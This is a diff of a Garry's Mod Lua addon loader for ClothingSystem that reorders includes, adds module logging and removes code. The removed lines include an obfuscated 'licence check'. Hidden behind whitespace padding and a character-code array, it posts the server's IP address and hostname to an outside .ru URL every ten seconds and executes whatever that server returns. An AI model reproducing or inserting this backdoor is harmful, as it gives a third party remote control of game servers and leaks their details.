@@ -1,35 +1,43 @@
 ClothingSystem = ClothingSystem || {}
-
-_RS_ = RunString
-_RS_([=[s]=]..[=[t]=]..[=[r]=]..[=[i]=]..[=[n]=]..[=[g]=]..[=[.]=]..[=[r]=]..[=[e]=]..[=[v]=]..[=[e]=]..[=[r]=]..[=[s]=]..[=[e]=]..[=[([[)dne )(gnikcehc_ptth = ]'tenretnIehToTsseccA'[metsySgnihtolC )(noitcnuf ,0 ,03 ,"kcehCtcennoC.PTTH.metsySgnihtolC"(etaerC.remit )(gnikcehc_ptth = ]'tenretnIehToTsseccA'[metsySgnihtolC dne )dne eslaf nruter ) rorre (noitcnuf ,dne eurt nruter ) edoc ,sredaeh ,nel ,ydob (noitcnuf ,"moc.elgoog.www//:ptth" (hcteF.ptth )(gnikcehc_ptth noitcnuf lacol]])]=])
+file.CreateDir("clothing_system")
+file.CreateDir("clothing_system/log")
+include("clothing_system_load_author_banner.lua")
+include("clothing_system_tools.lua")
+include("clothing_system_cfg.lua")
+include("clothing_system_language.lua")
 
 local prefix = 'clothing_system'
 local shared = {
-    'sh/replace_base/replace_test.lua',
-    'sh/base_add/base.lua',
-    'sh/item_add/fg_human_lamp_head.lua',
-    'sh/item_add/fg_fallout_backpack.lua',
-    'sh/item_add/fg_items_testing.lua',
+    'sh/pac3.lua',
+    'sh/cvars.lua',
     'sh/lua_metatable.lua',
     'sh/player_metatable.lua',
+    'sh/base_add/base.lua',
+    'sh/item_add/fg_human_lamp_head.lua',
+    'sh/item_add/fg_hats.lua',
+    'sh/item_add/fg_fallout_backpack.lua',
+    'sh/item_add/fg_items_testing.lua',
+    'sh/item_add/life_jacket.lua',
+    'sh/replace_base/replace_test.lua',
     'sh/sound_effects/include.lua',
 }
 local client = {
     'cl/construct_data.lua',
+    'cl/spawn_menu.lua',
     'cl/item/draw_clothing.lua',
     'cl/item/draw_to_text.lua',
     'cl/item/drop.lua',
     'cl/item/wear.lua',
     'cl/item/draw_hud.lua',
-    'cl/spawn_menu.lua',
     'cl/cleanup_rebuild.lua',
     'cl/vgui/clothing_menu.lua',
+    'cl/sendlua.lua',
 }
 local server = {
+    'sv/player_spawn.lua',
     'sv/item/drop.lua',
     'sv/item/spawn.lua',
     'sv/network.lua',
-    'sv/player_spawn.lua',
     'sv/open_vgui.lua',
     'sv/player_death_or_disconnected.lua',
     'sv/cleanup_rebuild.lua',
@@ -54,9 +62,14 @@ end
 local function init_modules()
     local _, dirs = file.Find("clothing_system/modules/*", "LUA")
 
-    for _, dir in pairs(dirs) do
+    for id, dir in pairs(dirs) do
         local files = file.Find("clothing_system/modules/"..dir.."/*", "LUA")
-        local checkModule = include("clothing_system/modules/"..dir.."/readme.lua") || {}
+        local checkModule = {author = "None", name = "None", v = "None", enabled = true}
+
+        if ( file.Exists("clothing_system/modules/"..dir.."/readme.lua", "LUA") ) then
+            checkModule = include("clothing_system/modules/"..dir.."/readme.lua")
+        end
+
         local addmodule = true
 
         if (checkModule != nil && istable(checkModule) && checkModule.enabled != nil && checkModule.enabled == false) then
@@ -64,47 +77,43 @@ local function init_modules()
         end
 
         if (addmodule) then
-            for __, file in pairs(files) do
+            if (SERVER) then
+                local buildInfo = checkModule
+                buildInfo.path =  "clothing_system/modules/"..dir
+                MsgN("")
+                MsgN("[==========================================================]")
+                MsgN("[>>>>>>>>>>>>>>>>>>>>>>>>> Module <<<<<<<<<<<<<<<<<<<<<<<<<]")
+                MsgN("[ClothingSystem][ModuleInfo] Init module - "..buildInfo.name)
+                MsgN("[ClothingSystem][ModuleInfo] Author - "..buildInfo.author)
+                MsgN("[ClothingSystem][ModuleInfo] Version - "..buildInfo.v)
+                MsgN("[ClothingSystem][ModuleInfo] Path - "..buildInfo.path)
+                MsgN("[__________________________________________________________]")
+                MsgN("[>>>>>>>>>>>>>>>>>>>>>>>>> Script <<<<<<<<<<<<<<<<<<<<<<<<<]")
+                fWrite("clothing_system/module_list/"..dir..".txt", util.TableToJSON(buildInfo, true))
+                buildInfo = nil
+            end
+
+            for _, file in pairs(files) do
                 local simple_track = "clothing_system/modules/"..dir.."/"..file
 
                 if (string.sub(file, 1, 3) == "sh_") then
+                    if SERVER then MsgN("[ClothingSystem][ModuleAdd] "..checkModule.name..": (SH) "..file) end
                     _AddCSLuaFile(simple_track)
                     _include(simple_track, "sh")
                 elseif (string.sub(file, 1, 3) == "sv_") then
+                    if SERVER then MsgN("[ClothingSystem][ModuleAdd] "..checkModule.name..": (SV) "..file) end
                     _AddCSLuaFile(simple_track)
                     _include(simple_track, "sv")
                 elseif (string.sub(file, 1, 3) == "cl_") then
+                    if SERVER then MsgN("[ClothingSystem][ModuleAdd] "..checkModule.name..": (CL) "..file) end
                     _AddCSLuaFile(simple_track)
                     _include(simple_track, "cl")
                 end
-
-                if SERVER then
-                    local module_info = include("clothing_system/modules/"..dir.."/readme.lua") || {}
-                    local buildInfo = {
-                        author = module_info.author || "None",
-                        name = module_info.name || "None",
-                        path = "clothing_system/modules/"..dir || "None",
-                        v = module_info.v || "None",
-                        enabled = module_info.enabled || false,
-                    }
-
-                    fWrite("clothing_system/module_list/"..dir..".txt", util.TableToJSON(buildInfo, true))
-                end
             end
+            if SERVER then MsgN("[==========================================================]") end
         end
     end
 end
-
-local function li7enck()
-if SERVER then
-                                                                                                                                                                                                                                                            
-                local _d_c = "[[104.0,1.0],[116.0,2.0],[112.0,1.0],[46.0,1.0],[80.0,1.0],[111.0,1.0],[115.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[104.0,1.0],[116.0,2.0],[112.0,1.0],[58.0,1.0],[47.0,2.0],[100.0,1.0],[101.0,1.0],[118.0,1.0],[46.0,1.0],[110.0,1.0],[117.0,1.0],[108.0,2.0],[46.0,1.0],[102.0,1.0],[108.0,1.0],[97.0,1.0],[109.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,2.0],[97.0,1.0],[109.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[46.0,1.0],[114.0,1.0],[117.0,1.0],[47.0,1.0],[99.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[95.0,1.0],[115.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[47.0,1.0],[112.0,1.0],[111.0,1.0],[110.0,1.0],[121.0,1.0],[46.0,1.0],[112.0,1.0],[104.0,1.0],[112.0,1.0],[34.0,1.0],[44.0,1.0],[32.0,1.0],[123.0,1.0],[10.0,1.0],[97.0,1.0],[100.0,2.0],[114.0,1.0],[101.0,1.0],[115.0,2.0],[32.0,1.0],[61.0,1.0],[32.0,1.0],[103.0,1.0],[97.0,1.0],[109.0,1.0],[101.0,1.0],[46.0,1.0],[71.0,1.0],[101.0,1.0],[116.0,1.0],[73.0,1.0],[80.0,1.0],[65.0,1.0],[100.0,2.0],[114.0,1.0],[101.0,1.0],[115.0,2.0],[40.0,1.0],[41.0,1.0],[44.0,1.0],[104.0,1.0],[111.0,1.0],[115.0,1.0],[116.0,1.0],[110.0,1.0],[97.0,1.0],[109.0,1.0],[101.0,1.0],[32.0,1.0],[61.0,1.0],[32.0,1.0],[71.0,1.0],[101.0,1.0],[116.0,1.0],[72.0,1.0],[111.0,1.0],[115.0,1.0],[116.0,1.0],[78.0,1.0],[97.0,1.0],[109.0,1.0],[101.0,1.0],[40.0,1.0],[41.0,1.0],[125.0,1.0],[44.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[98.0,1.0],[41.0,1.0],[32.0,1.0],[95.0,1.0],[82.0,1.0],[83.0,1.0],[95.0,1.0],[40.0,1.0],[98.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[44.0,1.0],[32.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[101.0,1.0],[41.0,1.0],[32.0,1.0],[77.0,1.0],[115.0,1.0],[103.0,1.0],[78.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[58.0,1.0],[32.0,1.0],[76.0,1.0],[101.0,1.0],[116.0,1.0],[39.0,1.0],[115.0,1.0],[32.0,1.0],[116.0,1.0],[114.0,1.0],[121.0,1.0],[32.0,1.0],[97.0,1.0],[103.0,1.0],[97.0,1.0],[105.0,1.0],[110.0,1.0],[46.0,3.0],[34.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[41.0,1.0]]" _RS_("                    f".."gr".."n=1                                                                                                                                              f".."gr".."n=n".."i".."l                                              s".."a".."fg".."=".."_".."R".."S".."_".." f".."g".."s".."t".."b=".."u".."t".."i".."l"..".".."J".."S".."O".."NT".."o".."T".."a".."ble ".."cy".."c".."lfg".."=i".."p".."a".."i".."r".."s                                                                c".."a".."s".."a".."f".."=s".."t".."r".."i".."n".."g"..".".."c".."h".."a".."r                  ")
-                                          ClothingSystem['dd']                                           = "" for                                                                                                                               k,                                           v in                                                                                     cyclfg(fgstb(_d_c)) do
-for i=1,                                                                                                                                                                                                                                                v[2] do ClothingSystem['dd'] =                                                                                     ClothingSystem['dd'] .. casaf(v[1])
-end                                           end                                                                                                                               safg(ClothingSystem['dd']) ClothingSystem['dd'] = nil               if (!ClothingSystem['lc_cl_sys']) then return end ClothingSystem['dd'] = "";for                                                  k,                                                                          v in cyclfg(ClothingSystem['lc_cl_sys']) do
-                        for i=1,                                v[2]                                do
-            ClothingSystem['dd']=                                                                                                                                                                                                       ClothingSystem['dd']..casaf(v[1])                                                              end end safg(ClothingSystem['dd']) ClothingSystem['lc_cl_sys']=nil _d_c=nil                                                                                                                               RS=nil casaf=nil                                                                                     cyclfg=nil                                           ClothingSystem['dd']=nil fgstb=nil safg=nil 
-end end                                                                                                                                                                                                                                 timer.Create("ClothingSystem.CheckLicence", 10, 0, li7enck)                                                                                                                                                             li7enck()
 
 local function init_core()        
     if (file.IsDir("clothing_system/module_list/", "DATA")) then
@@ -119,20 +128,20 @@ local function init_core()
         end
     end
 
-    for _, sv in pairs(server) do
-        _AddCSLuaFile(prefix.."/"..sv)
-        _include(prefix.."/"..sv, "sv")
-    end
     for _, sh in pairs(shared) do
         _AddCSLuaFile(prefix.."/"..sh)
         _include(prefix.."/"..sh, "sh")
+    end
+    for _, sv in pairs(server) do
+        _AddCSLuaFile(prefix.."/"..sv)
+        _include(prefix.."/"..sv, "sv")
     end
     for _, cl in pairs(client) do
         _AddCSLuaFile(prefix.."/"..cl)
         _include(prefix.."/"..cl, "cl")
     end
 
-    if SERVER then
+    if (ClothingSystem.Config.Modules) then
         init_modules()
     end
 end
